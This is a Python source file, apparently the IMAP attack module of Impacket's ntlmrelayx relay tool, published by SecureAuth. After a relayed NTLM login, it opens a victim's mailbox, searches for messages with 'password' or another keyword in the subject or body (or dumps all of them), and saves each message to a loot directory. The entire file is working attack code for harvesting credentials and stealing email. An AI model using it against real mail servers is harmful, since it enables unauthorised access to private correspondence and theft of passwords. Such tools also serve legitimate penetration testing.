# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# IMAP Attack Class
#
# Authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
#
# Description:
#  IMAP protocol relay attack
#
# ToDo:
#
import re
import os
from impacket import LOG
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack

PROTOCOL_ATTACK_CLASS = "IMAPAttack"

class IMAPAttack(ProtocolAttack):
    """
    This is the default IMAP(s) attack. By default it searches the INBOX imap folder
    for messages with "password" in the header or body. Alternate keywords can be specified
    on the command line. For more advanced attacks, consider using the SOCKS feature.
    """
    PLUGIN_NAMES = ["IMAP", "IMAPS"]
    def run(self):
        #Default action: Search the INBOX
        targetBox = self.config.mailbox
        result, data = self.client.select(targetBox,True) #True indicates readonly
        if result != 'OK':
            LOG.error('Could not open mailbox %s: %s' % (targetBox, data))
            LOG.info('Opening mailbox INBOX')
            targetBox = 'INBOX'
            result, data = self.client.select(targetBox,True) #True indicates readonly
        inboxCount = int(data[0])
        LOG.info('Found %s messages in mailbox %s' % (inboxCount, targetBox))
        #If we should not dump all, search for the keyword
        if not self.config.dump_all:
            result, rawdata = self.client.search(None, 'OR', 'SUBJECT', '"%s"' % self.config.keyword, 'BODY', '"%s"' % self.config.keyword)
            #Check if search worked
            if result != 'OK':
                LOG.error('Search failed: %s' % rawdata)
                return
            dumpMessages = []
            #message IDs are separated by spaces
            for msgs in rawdata:
                dumpMessages += msgs.split(' ')
            if self.config.dump_max != 0 and len(dumpMessages) > self.config.dump_max:
                dumpMessages = dumpMessages[:self.config.dump_max]
        else:
            #Dump all mails, up to the maximum number configured
            if self.config.dump_max == 0 or self.config.dump_max > inboxCount:
                dumpMessages = range(1, inboxCount+1)
            else:
                dumpMessages = range(1, self.config.dump_max+1)

        numMsgs = len(dumpMessages)
        if numMsgs == 0:
            LOG.info('No messages were found containing the search keywords')
        else:
            LOG.info('Dumping %d messages found by search for "%s"' % (numMsgs, self.config.keyword))
            for i, msgIndex in enumerate(dumpMessages):
                #Fetch the message
                result, rawMessage = self.client.fetch(msgIndex, '(RFC822)')
                if result != 'OK':
                    LOG.error('Could not fetch message with index %s: %s' % (msgIndex, rawMessage))
                    continue

                #Replace any special chars in the mailbox name and username
                mailboxName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', targetBox)
                textUserName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', self.username)

                #Combine username with mailboxname and mail number
                fileName = 'mail_' + textUserName + '-' + mailboxName + '_' + str(msgIndex) + '.eml'

                #Write it to the file
                with open(os.path.join(self.config.lootdir,fileName),'w') as of:
                    of.write(rawMessage[0][1])
                LOG.info('Done fetching message %d/%d' % (i+1,numMsgs))

        #Close connection cleanly
        self.client.logout()
